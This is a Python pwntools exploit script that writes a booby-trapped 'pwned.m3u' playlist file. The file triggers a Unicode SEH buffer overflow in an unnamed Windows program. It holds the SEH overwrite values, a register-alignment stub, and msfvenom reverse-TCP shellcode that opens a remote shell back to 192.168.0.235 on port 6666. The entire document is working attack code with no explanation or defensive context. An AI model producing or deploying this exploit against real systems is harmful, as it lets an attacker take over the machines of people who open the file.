from pwn import *

context(arch='i386',os='windows')

# setup SEH
buf = b'A'*536
# nSEH NOP
buf += p16(0x4161)
# SEH pop,pop,ret address (0x004100f2) & NOP
buf += p16(0x41f2)

# increase eax so that we can jump to it
buf += b'\x90'
buf += b'\x6e'
buf += asm('add eax,0x13003700').replace(b'\x00',b'')
buf += b'\x6e'
buf += asm('sub eax,0x13003600').replace(b'\x00',b'')
buf += b'\x6e'
buf += asm('push eax')
buf += b'\x6e'
buf += asm('ret')

# difference between eax and start of buffer, divided by 2 to account for unicode translation minus 1 to align on the stack
buf += b'B'*(0x6f)

# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -e x86/unicode_mixed BufferRegister=EAX LHOST=192.168.0.235 LPORT=6666 -f python
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += b"\x47\x42\x39\x75\x34\x4a\x42\x4b\x4c\x39\x58\x45\x32"
buf += b"\x6b\x50\x4b\x50\x6b\x50\x71\x50\x43\x59\x4b\x35\x4c"
buf += b"\x71\x35\x70\x32\x44\x42\x6b\x30\x50\x4c\x70\x54\x4b"
buf += b"\x61\x42\x5a\x6c\x52\x6b\x70\x52\x4e\x34\x52\x6b\x33"
buf += b"\x42\x6d\x58\x6c\x4f\x54\x77\x70\x4a\x6e\x46\x4c\x71"
buf += b"\x4b\x4f\x74\x6c\x6f\x4c\x43\x31\x71\x6c\x6a\x62\x4c"
buf += b"\x6c\x4d\x50\x76\x61\x76\x6f\x4c\x4d\x5a\x61\x77\x57"
buf += b"\x67\x72\x7a\x52\x50\x52\x4f\x67\x34\x4b\x61\x42\x6a"
buf += b"\x70\x54\x4b\x6f\x5a\x4f\x4c\x44\x4b\x4e\x6c\x6e\x31"
buf += b"\x73\x48\x49\x53\x6e\x68\x4b\x51\x47\x61\x4f\x61\x42"
buf += b"\x6b\x4e\x79\x6d\x50\x49\x71\x58\x53\x44\x4b\x4e\x69"
buf += b"\x7a\x78\x59\x53\x4d\x6a\x4f\x59\x54\x4b\x6f\x44\x64"
buf += b"\x4b\x4d\x31\x66\x76\x4c\x71\x39\x6f\x64\x6c\x56\x61"
buf += b"\x66\x6f\x4a\x6d\x7a\x61\x77\x57\x6f\x48\x6b\x30\x72"
buf += b"\x55\x5a\x56\x4b\x53\x33\x4d\x48\x78\x4d\x6b\x51\x6d"
buf += b"\x6f\x34\x70\x75\x68\x64\x32\x38\x64\x4b\x52\x38\x6f"
buf += b"\x34\x69\x71\x39\x43\x6f\x76\x42\x6b\x7a\x6c\x70\x4b"
buf += b"\x54\x4b\x30\x58\x6d\x4c\x59\x71\x39\x43\x34\x4b\x4b"
buf += b"\x54\x72\x6b\x4a\x61\x68\x50\x61\x79\x6d\x74\x4b\x74"
buf += b"\x6f\x34\x6f\x6b\x4f\x6b\x73\x31\x6e\x79\x30\x5a\x42"
buf += b"\x31\x39\x6f\x57\x70\x6f\x6f\x4f\x6f\x4e\x7a\x44\x4b"
buf += b"\x4d\x42\x58\x6b\x64\x4d\x6f\x6d\x42\x48\x6d\x63\x6d"
buf += b"\x62\x4d\x30\x4d\x30\x63\x38\x61\x67\x63\x43\x70\x32"
buf += b"\x6f\x6f\x32\x34\x63\x38\x50\x4c\x50\x77\x4c\x66\x4d"
buf += b"\x37\x39\x6f\x66\x75\x67\x48\x72\x70\x79\x71\x6d\x30"
buf += b"\x6d\x30\x6e\x49\x38\x44\x71\x44\x4e\x70\x50\x68\x6b"
buf += b"\x79\x53\x50\x70\x6b\x49\x70\x69\x6f\x58\x55\x42\x30"
buf += b"\x70\x50\x62\x30\x50\x50\x6f\x50\x4e\x70\x4d\x70\x32"
buf += b"\x30\x70\x68\x7a\x4a\x4c\x4f\x49\x4f\x59\x50\x79\x6f"
buf += b"\x6a\x35\x56\x37\x50\x6a\x4a\x65\x33\x38\x35\x70\x33"
buf += b"\x78\x4d\x30\x7a\x4b\x73\x38\x6c\x42\x49\x70\x4c\x5a"
buf += b"\x5a\x6a\x75\x39\x6a\x46\x4f\x7a\x7a\x70\x50\x56\x52"
buf += b"\x37\x63\x38\x73\x69\x54\x65\x70\x74\x61\x51\x69\x6f"
buf += b"\x68\x55\x63\x55\x59\x30\x62\x54\x4a\x6c\x69\x6f\x50"
buf += b"\x4e\x7a\x68\x61\x65\x5a\x4c\x50\x68\x4c\x30\x44\x75"
buf += b"\x65\x52\x52\x36\x79\x6f\x39\x45\x61\x58\x32\x43\x50"
buf += b"\x6d\x52\x44\x39\x70\x54\x49\x58\x63\x50\x57\x4f\x67"
buf += b"\x52\x37\x6e\x51\x68\x76\x6f\x7a\x6d\x42\x72\x39\x30"
buf += b"\x56\x68\x62\x4b\x4d\x43\x36\x55\x77\x51\x34\x6e\x44"
buf += b"\x6f\x4c\x7a\x61\x4b\x51\x44\x4d\x71\x34\x6e\x44\x4e"
buf += b"\x30\x77\x56\x6d\x30\x71\x34\x62\x34\x62\x30\x32\x36"
buf += b"\x31\x46\x51\x46\x61\x36\x62\x36\x6e\x6e\x6f\x66\x4e"
buf += b"\x76\x72\x33\x30\x56\x42\x48\x70\x79\x38\x4c\x4f\x4f"
buf += b"\x34\x46\x79\x6f\x69\x45\x75\x39\x39\x50\x30\x4e\x31"
buf += b"\x46\x31\x36\x49\x6f\x30\x30\x61\x58\x79\x78\x51\x77"
buf += b"\x4d\x4d\x31\x50\x6b\x4f\x79\x45\x57\x4b\x38\x70\x58"
buf += b"\x35\x54\x62\x62\x36\x50\x68\x77\x36\x45\x45\x47\x4d"
buf += b"\x53\x6d\x39\x6f\x57\x65\x4f\x4c\x49\x76\x33\x4c\x7a"
buf += b"\x6a\x43\x50\x49\x6b\x4b\x30\x63\x45\x4d\x35\x35\x6b"
buf += b"\x61\x37\x7a\x73\x34\x32\x32\x4f\x50\x6a\x6d\x30\x50"
buf += b"\x53\x59\x6f\x49\x45\x41\x41"

buf += b'C'*(5000-len(buf))

with open('pwned.m3u','wb') as f:
    f.write(buf)
